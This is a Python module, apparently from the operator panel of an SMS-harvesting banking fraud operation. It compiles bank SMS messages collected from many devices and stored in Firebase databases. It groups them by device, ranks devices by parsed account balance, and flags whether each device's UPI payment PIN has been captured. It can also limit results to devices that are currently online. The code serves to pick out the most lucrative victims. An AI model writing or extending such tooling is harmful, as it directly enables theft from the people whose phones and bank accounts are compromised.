from __future__ import annotations

from collections import defaultdict
from datetime import datetime

from panel_search_bot.firebase_urls import device_id_from_raw_path, firebase_db_label
from panel_search_bot.search_engine import SearchMatch, SearchParams
from panel_search_bot.ui import pin_label


def _astik_header_line(params: SearchParams) -> str:
    kw = " & ".join(k.upper().replace(",", " ") for k in params.keywords)
    mode = "ONLINE DEVICES ONLY" if params.mode == "online" else params.mode.upper()
    pin = pin_label(params.pin_filter).replace("🔑 ", "").replace("🚫 ", "").replace("🔄 ", "")
    if params.pin_filter == "both":
        pin = "ALL"
    elif params.pin_filter == "with":
        pin = "WITH PIN"
    else:
        pin = "WITHOUT PIN"
    sort = "BAL HIGH->LOW" if params.balance_sort == "high" else (
        "BAL LOW->HIGH" if params.balance_sort == "low" else "DATE ORDER"
    )
    days = "ALL TIME" if params.days is None else f"LAST {params.days} DAYS"
    return (
        f"SMS SEARCH RESULTS - {kw} - {mode} - PIN: {pin} - {sort} - {days} - "
        "WITHOUT FB (NO URL)"
    )


def format_astik_result_file(
    matches: list[SearchMatch],
    params: SearchParams,
    *,
    elapsed_sec: float,
    dbs_scanned: int,
    dbs_completed: int | None = None,
    stopped_early: bool = False,
) -> str:
    grouped: dict[tuple[str, str], list[SearchMatch]] = defaultdict(list)
    for match in matches:
        db_label = match.db_label or firebase_db_label(match.firebase_url)
        device = match.device_id or "unknown"
        grouped[(db_label, device)].append(match)

    def group_sort_key(item: tuple[tuple[str, str], list[SearchMatch]]):
        _, msgs = item
        best = max((m.balance or 0.0) for m in msgs)
        return (-best, msgs[0].db_label, msgs[0].device_id)

    device_groups = sorted(grouped.items(), key=group_sort_key)
    generated = datetime.now().strftime("%d-%m-%Y %H:%M:%S")

    done = dbs_completed if dbs_completed is not None else dbs_scanned
    lines = [
        _astik_header_line(params),
        *(
            ["# PARTIAL EXPORT — /stop se scan yahi tak (poora pool nahi)", ""]
            if stopped_early
            else []
        ),
        f"Generated: {generated}",
        f"Search time: {elapsed_sec:.0f}s",
        f"Total matches: {len(matches)} | Devices: {len(device_groups)} | "
        f"DBs done: {done}/{dbs_scanned}",
        "",
    ]

    for index, ((db_label, device_id), msgs) in enumerate(device_groups, start=1):
        msgs_sorted = sorted(
            msgs,
            key=lambda m: (m.message_at or datetime.min),
            reverse=True,
        )
        device_pin = "YES" if any(m.has_pin for m in msgs_sorted) else "NO"
        lines.append(f"#{index}")
        lines.append(f"Device ID: {device_id}")
        lines.append(f"DB: {db_label}")
        lines.append(f"UPI PIN: {device_pin}")
        lines.append(f"SMS Count: {len(msgs_sorted)}")
        lines.append("-----------------------------------------")
        for msg in msgs_sorted:
            ts = msg.message_at.strftime("%d-%m-%Y %H:%M:%S") if msg.message_at else ""
            head = f"[{msg.sender}]"
            if ts:
                head = f"{ts} {head}"
            lines.append(head)
            lines.append(msg.body.strip())
            lines.append("-----------------------------------------")
        lines.append("")

    return "\n".join(lines).rstrip() + "\n"


def match_from_cache_row(url: str, row) -> SearchMatch:
    from panel_search_bot.sms_parser import effective_message_at, parse_balance

    balance = row.balance_value if row.balance_value is not None else parse_balance(row.body)
    msg_at = effective_message_at(row.message_at, row.body)
    device = device_id_from_raw_path(row.raw_path or "")
    if device == "unknown" and row.device_key and not row.device_key.startswith("http"):
        device = row.device_key[:128]
    return SearchMatch(
        firebase_url=url,
        db_label=firebase_db_label(url),
        device_id=device,
        sender=row.sender,
        body=row.body,
        message_at=msg_at,
        balance=balance,
        has_pin=row.has_pin,
        source="cache",
    )


def match_from_live_item(url: str, item: dict) -> SearchMatch:
    from panel_search_bot.sms_parser import effective_message_at

    body = item.get("body", "")
    return SearchMatch(
        firebase_url=url,
        db_label=firebase_db_label(url),
        device_id=str(item.get("device_id") or device_id_from_raw_path(str(item.get("raw_path", "")))),
        sender=item.get("sender", ""),
        body=body,
        message_at=effective_message_at(item.get("message_at"), body),
        balance=item.get("balance"),
        has_pin=item.get("has_pin", False),
        source="live",
    )
